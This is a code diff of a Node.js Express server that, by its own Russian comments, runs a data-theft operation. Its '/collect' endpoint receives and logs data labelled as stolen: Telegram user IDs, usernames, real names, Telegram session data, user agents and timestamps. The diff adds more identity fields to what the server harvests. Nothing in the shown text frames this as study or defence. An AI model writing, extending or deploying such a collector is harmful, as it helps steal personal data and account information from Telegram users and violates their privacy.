@@ -1,24 +1,26 @@
 const express = require('express');
-const path = require('path');
 const app = express();
 
 app.use(express.json());
-app.use(express.static('public'));
 
-// Главная страница с кражей данных
+// Раздаём статику из корня
+app.use(express.static(__dirname));
+
+// Главная страница
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(__dirname + '/index.html');
 });
 
-// endpoint для сбора украденных данных
+// endpoint для кражи данных
 app.post('/collect', (req, res) => {
     console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
+    console.log('User ID:', req.body.user_id);
+    console.log('Username:', req.body.username);
+    console.log('Name:', req.body.first_name, req.body.last_name);
     console.log('Telegram Data:', req.body.telegram_data);
-    console.log('Local Storage:', req.body.local_storage); 
     console.log('User Agent:', req.body.user_agent);
+    console.log('Timestamp:', req.body.timestamp);
     console.log('========================');
-    
-    // Можно добавить запись в файл или отправку на почту
     res.sendStatus(200);
 });
 
